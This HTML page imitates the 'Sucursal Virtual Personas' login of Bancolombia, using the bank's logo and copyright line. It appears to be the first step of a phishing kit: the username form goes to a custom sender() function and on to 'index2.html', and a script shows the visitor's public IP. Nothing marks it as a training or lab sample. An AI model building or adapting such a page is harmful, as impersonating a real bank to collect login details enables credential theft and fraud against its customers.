<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sucursal Virtual Personas - Inicio</title>
  <link rel="stylesheet" href="css/styles.css" />
  <link rel="stylesheet" href="css/bootstrap.css" />
  <link rel="shortcut icon" href="img/favicon.ico" />
</head>
<body>
  <main class="login-container">
    <div class="login-box">
      <header class="login-header">
        <img src="img/logo-bancolombia.png" alt="Logo Bancolombia" class="logo" />
        <h1>Sucursal Virtual Personas</h1>
        <p class="subtext">Bienvenido. Ingresa para continuar con tu proceso.</p>
      </header>

      <form id="loginUserForm" name="loginUserForm" onsubmit="return sender('DocumentNumber', 'index2.html');">
        <div class="form-group">
          <label for="DocumentNumber">Usuario</label>
          <input
            type="text"
            id="DocumentNumber"
            name="username"
            maxlength="20"
            class="form-control"
            placeholder="Ingresa tu usuario"
            required
            autocomplete="off"
          />
        </div>

        <button type="submit" class="btn btn-primary btn-block">Continuar</button>

        <div class="login-links">
          <a href="#">¿Olvidaste tu usuario?</a> |
          <a href="#">¿Problemas para conectarte?</a>
        </div>
      </form>

      <footer class="login-footer">
        <p>Dirección IP: <span id="gfg"></span></p>
        <p>&copy; <span id="fecha"></span> Bancolombia S.A.</p>
      </footer>
    </div>
  </main>

  <!-- JS -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script>
    // IP pública
    $.getJSON("https://api.ipify.org?format=json", function(data) {
      $("#gfg").html(data.ip);
    });

    // Año actual
    document.addEventListener("DOMContentLoaded", () => {
      document.getElementById("fecha").textContent = new Date().getFullYear();
    });
  </script>
</body>
</html>
